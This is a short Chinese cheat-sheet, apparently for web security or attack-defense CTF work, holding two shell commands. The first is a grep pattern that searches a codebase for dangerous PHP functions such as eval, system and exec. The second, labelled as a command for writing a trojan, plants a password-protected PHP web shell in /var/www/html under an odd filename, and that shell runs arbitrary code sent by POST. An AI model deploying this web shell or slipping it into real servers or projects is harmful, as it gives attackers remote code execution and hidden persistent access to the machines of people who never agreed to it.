快速查找可疑函数命令：
```shell
grep -r -n -P '(eval|assert|system|exec|passthru|shell_exec|popen|proc_open|file_get_contents|fopen|fread|file|readfile|include|require|include_once|require_once)\s*\(|`[^`]+`' .
```

写马命令：
```shell
bash -c 'echo "<?php if(md5(\$_GET[\"pass\"])==\"0d823a43429d77faecac004d2c77e8fe\"){@eval(\$_POST[\"cmd\"]);}?>" > /var/www/html/-g\&t.php'
```

